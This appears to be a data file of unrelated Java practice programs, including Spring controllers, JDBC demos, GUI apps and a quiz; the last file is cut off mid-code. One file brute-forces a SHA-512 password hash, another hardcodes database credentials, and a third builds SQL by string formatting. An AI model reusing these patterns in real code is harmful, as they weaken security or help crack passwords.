    "package com.ghanem.ticketapi.security;\n\nimport com.ghanem.ticketapi.models.User;\nimport com.ghanem.ticketapi.repositories.UserRepository;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.security.authentication.AuthenticationProvider;\nimport org.springframework.security.authentication.BadCredentialsException;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.stereotype.Component;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n@Component\npublic class UserPwdAuthenticationProvider implements\n        AuthenticationProvider {\n    @Autowired\n    private UserRepository userRepository;\n\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n\n    @Override\n    public Authentication authenticate(Authentication authentication) throws AuthenticationException {\n        String email = authentication.getName();\n        String pwd = authentication.getCredentials().toString();\n        User user = userRepository.readByEmail(email);\n        if(null != user && user.getUser_id()>0 &&\n       passwordEncoder.matches(pwd, user.getPassword())){\n            return new UsernamePasswordAuthenticationToken(\n                    email, pwd, getGrantedAuthorities()\n            );\n        }else  {\n            throw new BadCredentialsException(\"Invaild Credentials!\");\n        }\n    }\n\n    private List<GrantedAuthority> getGrantedAuthorities() {\n        List<GrantedAuthority> grantedAuthorities = new ArrayList<>();\n        grantedAuthorities.add(new SimpleGrantedAuthority(\"ROLE_USER\"));\n        return grantedAuthorities;\n    }\n\n    @Override\n    public boolean supports(Class<?> authentication) {\n        return authentication.equals(UsernamePasswordAuthenticationToken.class);\n    }\n}\n",
    "package jdbcConnection;\r\n\r\nimport java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.ResultSet;\r\nimport java.sql.SQLException;\r\n\r\npublic class prepClass {\r\n\tpublic static void main(String[] args) {\r\n\t\tString url = \"jdbc:sqlserver://10.0.2.67;databaseName=TrainingDec2023;trustServerCertificate=true\";\r\n\t\tString user = \"poornap\";\r\n\t\tString pass = \"Praj@dec23\";\r\n\r\n\t\tString sql = \"SELECT * FROM empPoorna WHERE department = ? \";\r\n\r\n\t\ttry (Connection conn = DriverManager.getConnection(url, user, pass);\r\n\r\n\t\t\t\tPreparedStatement preparedStatement = conn.prepareStatement(sql);) {\r\n\r\n\t\t\tpreparedStatement.setString(1, \"HR\");\r\n\r\n\t\t\tResultSet rs = preparedStatement.executeQuery();\r\n\r\n\t\t\twhile (rs.next()) {\r\n//\t\t\t\tString Title = rs.getString(\"Title\");\r\n//\t\t\t\tSystem.out.println( Title);\r\n\t\t\t\tint id = rs.getInt(\"employee_id\");\r\n\t\t\t\tString name = rs.getString(\"first_name\");\r\n\t\t\t\tString email = rs.getString(\"email\");\r\n\t\t\t\tString hire_date = rs.getString(\"hire_date\");\r\n\t\t\t\tSystem.out.println(id + \"\\t\\t\" + name + \"\\t\\t\" + email + \"\\t\\t\" + hire_date);\r\n\t\t\t}\r\n\t\t} catch (SQLException e) {\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t}\r\n}\r\n",
    "package ru.netology.testcontainers_kubernetes;\n\n\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.BeforeAll;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.boot.test.web.client.TestRestTemplate;\nimport org.springframework.http.ResponseEntity;\nimport org.testcontainers.containers.GenericContainer;\n\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\nclass TestcontainersKubernetesApplicationTests {\n\n    @Autowired\n    TestRestTemplate restTemplate;\n\n    private static final GenericContainer<?> devApp = new GenericContainer<>(\"devapp\")\n            .withExposedPorts(8080);\n\n    private static final GenericContainer<?> prodApp = new GenericContainer<>(\"prodapp\")\n            .withExposedPorts(8081);\n\n    @BeforeAll\n    public static void setUp() {\n        devApp.start();\n        prodApp.start();\n\n    }\n\n    @Test\n    void contextLoads() {\n        ResponseEntity<String> forEntity  = restTemplate.getForEntity(\"http://localhost:\" +\n                devApp.getMappedPort(8080) + \"/profile\", String.class);\n        Assertions.assertEquals(\"Current profile is dev\", forEntity .getBody());\n        System.out.println(forEntity .getBody());\n\n    }\n\n\n\n    @Test\n    void contextLoads2() {\n        ResponseEntity<String> forEntity  = restTemplate.getForEntity(\"http://localhost:\" +\n                prodApp.getMappedPort(8081) + \"/profile\", String.class);\n        Assertions.assertEquals(\"Current profile is production\", forEntity .getBody());\n        System.out.println(forEntity .getBody());\n\n    }\n\n}",
    "package org.example.services;\n\nimport org.example.model.Cinema;\nimport org.example.model.Seat;\nimport org.example.model.SeatComputer;\nimport org.example.repositories.CinemaRepository;\nimport org.example.repositories.SeatComputerRepository;\nimport org.springframework.stereotype.Service;\n\nimport java.util.List;\n\n@Service\npublic class BookServiceImpl implements BookService {\n\n    private final CinemaRepository cinemaRepository;\n    private final SeatComputerRepository seatComputerRepository;\n    private Cinema cinema;\n\n    public BookServiceImpl(CinemaRepository cinemaRepository, SeatComputerRepository seatComputerRepository){\n        this.cinemaRepository = cinemaRepository;\n        this.seatComputerRepository = seatComputerRepository;\n    }\n\n    public boolean bookSeat(int row, int column){\n        return cinema.bookSeat(row, column);\n    }\n\n    public List<Seat> getBestSeats(int numberOfSeats){\n        return cinema.getBestSeats(numberOfSeats);\n    }\n    public void init(){\n        SeatComputer seatComputer = new SeatComputer();\n        this.cinema = new Cinema(9 ,10, seatComputer);\n        cinemaRepository.save(cinema);\n        seatComputerRepository.save(seatComputer);\n        for (int i = 0; i < 9; i++) {\n            for (int j = 0; j < 10; j++) {\n                cinema.getSeats().add(createSeat(i, j));\n            }\n        }\n        seatComputer.setCinema(cinema);\n\n    }\n\n    private Seat createSeat(int row, int column){\n        int columns = cinema.getSeatsPerRow();\n        int c;\n        if (column >= columns / 2) {\n            c = Math.abs(column - columns / 2 + 1) * 2;\n        } else {\n            c = Math.abs(columns / 2 - column) * 2 - 1;\n        }\n        return new Seat(row, c);\n    }\n\n    public String getSeats(){\n        StringBuilder seats = new StringBuilder();\n\n        for (int i = 0; i < cinema.getRows(); i++) {\n            for (int j = 0; j < cinema.getSeatsPerRow(); j++) {\n                seats.append(cinema.getSeats().get(i * cinema.getSeatsPerRow() + j).isBooked() ? \"X\" : \"O\");\n            }\n            seats.append(\"\\n\");\n        }\n        return seats.toString();\n    }\n}\n",
    "package sample.manager.ManagerPages;\n\nimport javafx.event.ActionEvent;\nimport javafx.fxml.FXMLLoader;\nimport javafx.fxml.Initializable;\nimport javafx.scene.input.MouseEvent;\nimport javafx.scene.layout.BorderPane;\nimport javafx.scene.layout.Pane;\nimport java.net.URL;\nimport java.util.ResourceBundle;\n\npublic class ManagerMain implements Initializable {\n    public BorderPane borderpane;\n\n    @Override\n    public void initialize(URL location, ResourceBundle resources) {\n        windowLoad(\"ManagerHome.fxml\");\n    }\n\n    public void windowLoad(String URL)\n    {\n        try\n        {\n            Pane window = FXMLLoader.load(getClass().getResource(URL));\n            borderpane.setCenter(window);\n        }\n        catch(Exception err)\n        {\n            System.out.println(\"Problem : \" + err);\n        }\n    }\n\n    public void ManageRooms(ActionEvent actionEvent) {\n        windowLoad(\"ManagerManageRooms.fxml\");\n    }\n\n    public void ManagerHome(ActionEvent actionEvent) {\n        windowLoad(\"ManagerHome.fxml\");\n    }\n\n    public void ManagerCheckIn(ActionEvent actionEvent) {\n        windowLoad(\"ManagerCheckIn.fxml\");\n    }\n\n    public void ManagerCheckOut(ActionEvent actionEvent) {\n        windowLoad(\"ManagerCheckOut.fxml\");\n    }\n\n    public void CheckOutDetails(ActionEvent actionEvent) {\n        windowLoad(\"ManagerCheckOutDetails.fxml\");\n    }\n\n    public void closeApplication(MouseEvent mouseEvent) {\n        System.exit(0);\n    }\n}\n",
    "package com.hanbaguni.project.domain.user.api;\n\nimport com.hanbaguni.project.domain.user.domain.Board;\nimport com.hanbaguni.project.domain.user.dto.BasicBoardDto;\nimport com.hanbaguni.project.domain.user.dto.BoardDto;\nimport com.hanbaguni.project.domain.user.service.BoardService;\nimport jakarta.persistence.EntityNotFoundException;\nimport lombok.RequiredArgsConstructor;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.List;\n\n@Slf4j\n@RestController\n@RequiredArgsConstructor\n@RequestMapping(\"/board\")\npublic class BoardController {\n\n    private final BoardService boardService;\n\n    @PostMapping(\"/create\")\n    public ResponseEntity<Board> create(@RequestBody BoardDto boardDto, Authentication authentication){\n        if(authentication == null) {\n            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();\n        }\n        String username = authentication.getName();\n        Board board = boardService.createBoard(username, boardDto);\n        return ResponseEntity.ok(board);\n    }\n\n    @GetMapping\n    public ResponseEntity<List<BasicBoardDto>> getAllBoards(Authentication authentication) {\n        if(authentication == null) {\n            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();\n        }\n        String username = authentication.getName();\n        List<BasicBoardDto> boardList = boardService.getAllMemberBoards(username);\n        return ResponseEntity.ok(boardList);\n    }\n\n    @DeleteMapping(\"/delete/{id}\")\n    public ResponseEntity<?> boardDelete(@PathVariable Long id,Authentication authentication){\n        if(authentication == null) {\n            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();\n        }\n        boardService.deleteBoard(id);\n        return ResponseEntity.ok(\"Delete success\");\n    }\n\n    @PatchMapping(\"/update/{id}\")\n    public ResponseEntity<?> boardUpdate(@PathVariable Long id,@RequestBody BoardDto boardDto,Authentication authentication){\n        if(authentication == null) {\n            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();\n        }\n        String username = authentication.getName();\n        try {\n            boardService.updateBoard(username,id, boardDto);\n            return ResponseEntity.ok(\"Update success\");\n        } catch(EntityNotFoundException e) {\n            log.error(\"Board not found exception\");\n            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(\"Board not found\");\n        } catch (Exception e) {\n            log.error(\"Update failed\", e);\n            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\"Update failed\");\n        }\n    }\n\n}\n",
    "package baitap;\n\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Scanner;\n\npublic class Bai11 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n       int day = 0 , month = 0, year =0;\n       boolean validInput = false;\n       while (!validInput){\n           try {\n               System.out.println(\"Nh\u1eadp ng\u00e0y: \");\n               day = Integer.parseInt(scanner.nextLine());\n               System.out.println(\"Nh\u1eadp th\u00e1ng: \");\n               month = Integer.parseInt(scanner.nextLine());\n               System.out.println(\"Nh\u1eadp n\u0103m: \");\n               year = Integer.parseInt(scanner.nextLine());\n               if (year<=0 ||month<=0||month>12||day<=0||day>31){\n                   throw new IllegalArgumentException(\"Ng\u00e0y th\u00e1ng n\u0103m ko h\u1ee3p l\u1ec7 \");\n               }\n               validInput=true;\n           }catch (NumberFormatException e){\n               System.out.println(\"Nh\u1eadp 1 so m\u00e0 , nhap lai\");\n           }catch (IllegalArgumentException e){\n               System.out.println(e.getMessage());\n           }\n        }\n        System.out.println(\"H\u1ee3p l\u1ec7\");\n       scanner.close();\n    }\n}\n",
    "import java.util.*;\n\nclass QuizQuestion {\n    private String question;\n    private List<String> options;\n    private int correctOptionIndex;\n\n    public QuizQuestion(String question, List<String> options, int correctOptionIndex) {\n        this.question = question;\n        this.options = options;\n        this.correctOptionIndex = correctOptionIndex;\n    }\n\n    public String getQuestion() {\n        return question;\n    }\n\n    public List<String> getOptions() {\n        return options;\n    }\n\n    public int getCorrectOptionIndex() {\n        return correctOptionIndex;\n    }\n}\n\npublic class Quiz {\n    private List<QuizQuestion> questions;\n    private int score;\n    private Scanner scanner;\n\n    public Quiz(List<QuizQuestion> questions) {\n        this.questions = questions;\n        this.score = 0;\n        this.scanner = new Scanner(System.in);\n    }\n\n    public void displayQuestion(QuizQuestion question) {\n        System.out.println(question.getQuestion());\n        List<String> options = question.getOptions();\n        for (int i = 0; i < options.size(); i++) {\n            System.out.println((i + 1) + \". \" + options.get(i));\n        }\n    }\n\n    public void start() {\n        for (QuizQuestion question : questions) {\n            displayQuestion(question);\n            System.out.print(\"Enter your choice (1-\" + question.getOptions().size() + \"): \");\n            int userChoice = scanner.nextInt();\n            int correctOptionIndex = question.getCorrectOptionIndex();\n            if (userChoice == correctOptionIndex + 1) {\n                System.out.println(\"Correct!\");\n                score++;\n            } else {\n                System.out.println(\"Incorrect! The correct answer was: \" + (correctOptionIndex + 1));\n            }\n            System.out.println();\n        }\n        System.out.println(\"Quiz ended. Your score: \" + score + \"/\" + questions.size());\n        scanner.close();\n    }\n\n    public static void main(String[] args) {\n        // Sample quiz questions\n        List<QuizQuestion> questions = new ArrayList<>();\n        questions.add(new QuizQuestion(\"What data type is used to create variable that sholud store text?\", Arrays.asList(\"String\", \"Txt\", \"string\", \"myString\"), 0));\n        questions.add(new QuizQuestion(\"Which method is used to find the lenght of a String?\", Arrays.asList(\"getSize()\", \"lenght\", \"lenght()\", \"getLenght()\"), 2));\n        questions.add(new QuizQuestion(\"Which method is used to conver the string into uppercase?\", Arrays.asList(\"upperCase()\", \"UpperCase()\", \"toUpperCase()\", \"toUppercase()\"), 2));\n\n        Quiz quiz = new Quiz(questions);\n        quiz.start();\n    }\n}\n\n",
    "package com.example.Book_Info;\n\nimport jakarta.websocket.server.PathParam;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.List;\n\n@RestController\n@RequestMapping(\"/book_info\")\npublic class BookController {\n    @Autowired\n    private Book_Repo bookRepo;\n    @GetMapping(\"/get\")\n    public @ResponseBody Iterable<Book_Entity> getAll(){\n                return bookRepo.findAll();\n    }\n    @PostMapping(\"/add\")\n    public ResponseEntity<String> addAll(@RequestBody List<Book_Entity> b){\n        bookRepo.saveAll(b);\n        return ResponseEntity.ok(\"Saved in Database\");\n    }\n    @DeleteMapping(\"/remove\")\n    public ResponseEntity<String> removeIt(@PathParam(\"id\") Integer id){\n        bookRepo.deleteById(id);\n        return ResponseEntity.ok(\"deleted\");\n    }\n    @PutMapping(\"/update/{id}\")\n    public ResponseEntity<String> getUpdate(@PathVariable Integer id,@RequestBody Book_Entity bk) {\n                    if (!bookRepo.existsById(id)) {\n                return ResponseEntity.ok(\"Not found\");\n            }\n            bk.setId(id);\n            bookRepo.save(bk);\n            return ResponseEntity.ok(\"Successfully update in Database\");\n        }\n    }\n\n",
    "import java.util.Scanner;\n\npublic class Main {\n\n    public static void main(String[] args) {\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the ATM\");\n\n        ATM atm = new ATM();\n\n        while (true) {\n            if (atm.login()) {\n                while (true) {\n\n                    System.out.println(\"Choose an option:\");\n                    System.out.println(\"1. View transaction history\");\n                    System.out.println(\"2. Withdraw\");\n                    System.out.println(\"3. Deposit\");\n                    System.out.println(\"4. Transfer\");\n                    System.out.println(\"5. Quit\");\n                    System.out.print(\"Choice: \");\n\n                    int choice = scanner.nextInt();\n\n                    switch (choice) {\n                        case 1:\n                            atm.showTransactionHistory();\n                            break;\n                        case 2:\n                            atm.doWithdraw();\n                            break;\n                        case 3:\n                            atm.doDeposit();\n                            break;\n                        case 4:\n                            atm.doTransfer();\n                            break;\n                        case 5:\n                            System.out.println(\"Goodbye\");\n                            return;\n                        default:\n                            System.out.println(\"Invalid choice, please try again\");\n                            break;\n                    }\n                }\n            }\n            else {\n                System.out.println(\"Invalid user ID or PIN, please try again\");\n            }\n\n        }\n\n    }\n\n}\n",
    "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class DepartmentDatabase {\n    // JDBC URL, username, and password of MySQL server\n    private static final String URL = \"jdbc:mysql://localhost:3306/departments\";\n    private static final String USER = \"your_username\";\n    private static final String PASSWORD = \"your_password\";\n\n    // JDBC variables for opening, closing, and managing connection\n    private static Connection connection;\n    private static Statement statement;\n\n    public static void main(String[] args) {\n        try {\n            // Connect to MySQL database\n            connection = DriverManager.getConnection(URL, USER, PASSWORD);\n\n            // Create a statement\n            statement = connection.createStatement();\n\n            // Create table if not exists\n            createTable();\n\n            // Insert department\n            Department department = new Department(1, \"IT\");\n            insertDepartment(department);\n\n            // Close resources\n            statement.close();\n            connection.close();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Create department table\n    private static void createTable() throws SQLException {\n        String createTableQuery = \"CREATE TABLE IF NOT EXISTS department (id INT PRIMARY KEY, name VARCHAR(255))\";\n        statement.executeUpdate(createTableQuery);\n    }\n\n    // Insert department into the database\n    private static void insertDepartment(Department department) throws SQLException {\n        String insertQuery = String.format(\"INSERT INTO department VALUES (%d, '%s')\",\n                department.getId(), department.getName());\n        statement.executeUpdate(insertQuery);\n        System.out.println(\"Department inserted successfully.\");\n    }\n\n    // Department class representing Department object\n    static class Department {\n        private int id;\n        private String name;\n\n        public Department(int id, String name) {\n            this.id = id;\n            this.name = name;\n        }\n\n        public int getId() {\n            return id;\n        }\n\n        public String getName() {\n            return name;\n        }\n    }\n}",
    "package repository;\nimport domain.Student;\nimport validation.Validator;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\npublic class StudentXMLRepository extends AbstractXMLRepository<String, Student> {\n\n    public StudentXMLRepository(Validator<Student> validator, String XMLfilename) {\n        super(validator, XMLfilename);\n        loadFromXmlFile();\n    }\n\n    protected Element getElementFromEntity(Student student, Document XMLdocument) {\n        Element element = XMLdocument.createElement(\"student\");\n        element.setAttribute(\"ID\", student.getID());\n\n        element.appendChild(createElement(XMLdocument, \"Nume\", student.getNume()));\n        element.appendChild(createElement(XMLdocument, \"Grupa\", String.valueOf(student.getGrupa())));\n\n        return element;\n    }\n\n    protected Student getEntityFromNode(Element node) {\n        String ID = node.getAttributeNode(\"ID\").getValue();\n        String nume = node.getElementsByTagName(\"Nume\").item(0).getTextContent();\n        int grupa = Integer.parseInt(node.getElementsByTagName(\"Grupa\").item(0).getTextContent());\n\n        return new Student(ID, nume, grupa);\n    }\n}\n",
    "package second;\n\nimport java.nio.charset.StandardCharsets;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class Second_Main {\n    public static void main(String[] args) {\n        String targetHash = \"2a2375e1171723a0e04a3c49adccb4ec6db86b2f7527db45e0bb84d8d76a9b9d3536d39e01b92d303fc966b36aa73475f9aea541d63f5ad894a50dda63b68a1c\";\n        String password = crackPassword(targetHash);\n\n        if (password != null) {\n            System.out.println(\"\u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0439 \u043f\u0430\u0440\u043e\u043b\u044c: \" + password);\n        } else {\n            System.out.println(\"\u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0439 \u043f\u0430\u0440\u043e\u043b\u044c \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\");\n        }\n    }\n\n    public static String crackPassword(String targetHash) {\n        for (char c1 = 'a'; c1 <= 'e'; c1++) {\n            for (char c2 = 'a'; c2 <= 'e'; c2++) {\n                for (char c3 = 'a'; c3 <= 'e'; c3++) {\n                    for (char c4 = 'a'; c4 <= 'e'; c4++) {\n                        for (char c5 = 'a'; c5 <= 'e'; c5++) {\n                            String password = \"\" + c1 + c2 + c3 + c4 + c5;\n                            String hashedPassword = hashPassword(password);\n\n                            if (hashedPassword.equals(targetHash)) {\n                                return password;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        return null;\n    }\n\n    public static String hashPassword(String password) {\n        try {\n            MessageDigest digest = MessageDigest.getInstance(\"SHA-512\");\n            byte[] hash = digest.digest(password.getBytes(StandardCharsets.UTF_8));\n            return bytesToHex(hash);\n        } catch (NoSuchAlgorithmException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public static String bytesToHex(byte[] bytes) {\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n}\n",
    "//Basic Game Application\n// Basic Object, Image, Movement\n// Threaded\n\n//*******************************************************************************\n//Import Section\n//Add Java libraries needed for the game\n//import java.awt.Canvas;\n\n//Graphics Libraries\nimport java.awt.Graphics2D;\nimport java.awt.image.BufferStrategy;\nimport java.awt.*;\nimport javax.swing.JFrame;\nimport javax.swing.JPanel;\n\n//*******************************************************************************\n\npublic class BasicGameApp implements Runnable {\n\n    //Variable Definition Section\n    //Declare the variables used in the program\n    //You can set their initial values too\n\n    //Sets the width and height of the program window\n    final int WIDTH = 1000;\n    final int HEIGHT = 700;\n\n    //Declare the variables needed for the graphics\n    public JFrame frame;\n    public Canvas canvas;\n    public JPanel panel;\n\n    public BufferStrategy bufferStrategy;\n\n    // Main method definition\n    // This is the code that runs first and automatically\n    public static void main(String[] args) {\n        BasicGameApp ex = new BasicGameApp();   //creates a new instance of the game\n        new Thread(ex).start();                 //creates a threads & starts up the code in the run( ) method\n    }\n\n\n    // This section is the setup portion of the program\n    // Initialize your variables and construct your program objects here.\n    public BasicGameApp() { // BasicGameApp constructor\n\n        setUpGraphics();\n\n        //variable and objects\n        //create (construct) the objects needed for the game\n\n    } // end BasicGameApp constructor\n\n\n//*******************************************************************************\n//User Method Section\n//\n// put your code to do things here.\n\n    // main thread\n    // this is the code that plays the game after you set things up\n    public void run() {\n        //for the moment we will loop things forever.\n        while (true) {\n            moveThings();  //move all the game objects\n            render();  // paint the graphics\n            pause(10); // sleep for 10 ms\n        }\n    }\n\n    public void moveThings() {\n        //call the move() code for each object\n    }\n\n    //Paints things on the screen using bufferStrategy\n    private void render() {\n        Graphics2D g = (Graphics2D) bufferStrategy.getDrawGraphics();\n        g.clearRect(0, 0, WIDTH, HEIGHT);\n\n        //draw the images\n\n        g.dispose();\n        bufferStrategy.show();\n    }\n\n    //Pauses or sleeps the computer for the amount specified in milliseconds\n    public void pause(int time ) {\n        try {\n            Thread.sleep(time);\n        } catch (InterruptedException e) {\n        }\n    }\n\n    //Graphics setup method\n    private void setUpGraphics() {\n        frame = new JFrame(\"Application Template\");   //Create the program window or frame.  Names it.\n\n        panel = (JPanel) frame.getContentPane();  //sets up a JPanel which is what goes in the frame\n        panel.setPreferredSize(new Dimension(WIDTH, HEIGHT));  //sizes the JPanel\n        panel.setLayout(null);   //set the layout\n\n        // creates a canvas which is a blank rectangular area of the screen onto which the application can draw\n        // and trap input events (Mouse and Keyboard events)\n        canvas = new Canvas();\n        canvas.setBounds(0, 0, WIDTH, HEIGHT);\n        canvas.setIgnoreRepaint(true);\n\n        panel.add(canvas);  // adds the canvas to the panel.\n\n        // frame operations\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);  //makes the frame close and exit nicely\n        frame.pack();  //adjusts the frame and its contents so the sizes are at their default or larger\n        frame.setResizable(false);   //makes it so the frame cannot be resized\n        frame.setVisible(true);      //IMPORTANT!!!  if the frame is not set to visible it will not appear on the screen!\n\n        // sets up things so the screen displays images nicely.\n        canvas.createBufferStrategy(2);\n        bufferStrategy = canvas.getBufferStrategy();\n        canvas.requestFocus();\n        System.out.println(\"DONE graphic setup\");\n    }\n\n}\n\n",
    "import java.util.Scanner;\r\n\r\npublic class Safeinput {\r\n    private static final Scanner scanner = new Scanner(System.in);\r\n\r\n    public static String getString(String prompt) {\r\n        System.out.print(prompt);\r\n        return scanner.nextLine();\r\n    }\r\n\r\n    public static char getRegExChar(String prompt, String regex) {\r\n        char input;\r\n        do {\r\n            System.out.print(prompt);\r\n            String userInput = scanner.nextLine();\r\n            if (userInput.length() > 0) {\r\n                input = userInput.toLowerCase().charAt(0);\r\n                if (!Character.toString(input).matches(regex)) {\r\n                    System.out.println(\"Invalid input. Please try again.\");\r\n                } else {\r\n                    break;\r\n                }\r\n            } else {\r\n                System.out.println(\"Invalid input. Please try again.\");\r\n            }\r\n        } while (true);\r\n        return input;\r\n    }\r\n\r\n    public static int getRangedInt(String prompt, int min, int max) {\r\n        int value;\r\n        do {\r\n            System.out.print(prompt);\r\n            while (!scanner.hasNextInt()) {\r\n                System.out.print(\"Invalid input. \" + prompt);\r\n                scanner.next(); // Discard invalid input\r\n            }\r\n            value = scanner.nextInt();\r\n        } while (value < min || value > max);\r\n        scanner.nextLine(); // Consume newline\r\n        return value;\r\n    }\r\n\r\n    public static boolean getYNConfirm(String prompt) {\r\n        System.out.print(prompt);\r\n        String input = scanner.nextLine().trim().toLowerCase();\r\n        return input.equals(\"y\") || input.equals(\"yes\");\r\n    }\r\n}\r\n",
    "package org.example;\n\nimport com.naga.jpa.domain.Basket;\nimport com.naga.jpa.domain.IndexEnt;\nimport com.naga.jpa.domain.IndexEnv;\nimport jakarta.persistence.*;\n\nimport java.util.Arrays;\n\npublic class Main {\n    public static void main(String[] args) {\n        EntityManagerFactory emf = Persistence.createEntityManagerFactory(\"TEST\");\n        EntityManager em = emf.createEntityManager();\n\n//        createData(em);\n\n//        em.createQuery(\"select i from IndexEnv i where i.indexEnt.indexComponents\")\n    }\n\n    private static void createData(EntityManager em) {\n        Basket b1 = new Basket(\"IBM.N\", 11.1);\n        Basket b2 = new Basket(\"AAPL.OQ\", 22.2);\n        IndexEnt idx  = new IndexEnt(\".SPX\", Arrays.asList(b1, b2));\n        IndexEnv ie = new IndexEnv(1, idx);\n\n        EntityTransaction tx = em.getTransaction();\n        try {\n            tx.begin();\n            em.merge(ie);\n            tx.commit();\n        }\n        catch (Exception e) {\n            tx.rollback();\n            e.printStackTrace();\n        }\n    }\n}",
    "package edu.iu.habahram.GumballMachine.model;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Objects;\n\npublic final class GumballMachineRecord {\n    private String id;\n    private String state;\n\n    public void setId(String id) {\n        this.id = id;\n    }\n\n    public void setState(String state) {\n        this.state = state;\n    }\n\n    public void setCount(int count) {\n        this.count = count;\n    }\n\n    private Integer count;\n\n    public GumballMachineRecord(String id, String state, int count) {\n        this.id = id;\n        this.state = state;\n        this.count = count;\n    }\n\n    public String toLine(String machineId) {\n        String line = String.format(\"%1s,%2s,%3s\",\n                machineId,\n                getState(),\n                getCount());\n        return line;\n    }\n\n    public static GumballMachineRecord fromLine(String line) {\n        String[] tokens = line.split(\",\");\n        GumballMachineRecord gumballMachineRecord = new\n                GumballMachineRecord(tokens[0],\n                tokens[1],\n                Integer.valueOf(tokens[2]));\n        return gumballMachineRecord;\n    }\n\n    public String getId() {\n        return id;\n    }\n\n    public String getState() {\n        return state;\n    }\n\n    public Integer getCount() {\n        return count;\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        if (obj == this) return true;\n        if (obj == null || obj.getClass() != this.getClass()) return false;\n        var that = (GumballMachineRecord) obj;\n        return Objects.equals(this.id, that.id) &&\n                Objects.equals(this.state, that.state) &&\n                this.count == that.count;\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(id, state, count);\n    }\n\n    @Override\n    public String toString() {\n        return \"GumballMachineRecord[\" +\n                \"id=\" + id + \", \" +\n                \"state=\" + state + \", \" +\n                \"count=\" + count + ']';\n    }\n\n}\n",
    "package Tela;\n\nimport java.awt.Color;\nimport java.awt.EventQueue;\nimport java.awt.Font;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport javax.swing.JButton;\nimport javax.swing.JComboBox;\nimport javax.swing.JFrame;\nimport javax.swing.JLabel;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPanel;\nimport javax.swing.JTextPane;\nimport javax.swing.SwingConstants;\nimport javax.swing.UIManager;\nimport javax.swing.border.EmptyBorder;\n\npublic class telaApp extends JFrame {\n\n    private JPanel contentPane;\n    private List<Integer> numerosSorteados;\n    private JComboBox<Integer> quantidadeNumerosComboBox;\n\n    /**\n     * Launch the application.\n     */\n    public static void main(String[] args) {\n        EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                try {\n                    telaApp frame = new telaApp();\n                    frame.setVisible(true);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n    }\n\n    /**\n     * Create the frame.\n     */\n    public telaApp() {\n        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        setBounds(100, 100, 450, 450);\n        contentPane = new JPanel();\n        contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));\n        setContentPane(contentPane);\n        contentPane.setLayout(null);\n\n        JLabel ultimoNum = new JLabel(\"0\");\n        ultimoNum.setForeground(new Color(0, 0, 255));\n        ultimoNum.setHorizontalAlignment(SwingConstants.CENTER);\n        ultimoNum.setFont(new Font(\"Tahoma\", Font.BOLD, 30));\n        ultimoNum.setBounds(150, 174, 114, 45);\n        contentPane.add(ultimoNum);\n\n        JTextPane numSorteados = new JTextPane();\n        numerosSorteados = new ArrayList<Integer>();\n\n        quantidadeNumerosComboBox = new JComboBox<Integer>();\n        quantidadeNumerosComboBox.addItem(75);\n        quantidadeNumerosComboBox.addItem(80);\n        quantidadeNumerosComboBox.addItem(90);\n        quantidadeNumerosComboBox.setBounds(180, 60, 50, 25);\n        contentPane.add(quantidadeNumerosComboBox);\n\n        JButton botao = new JButton(\"Sortear\");\n        botao.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n            \t\n                quantidadeNumerosComboBox.setEnabled(false);\n\n                int maximo = (int) quantidadeNumerosComboBox.getSelectedItem();\n         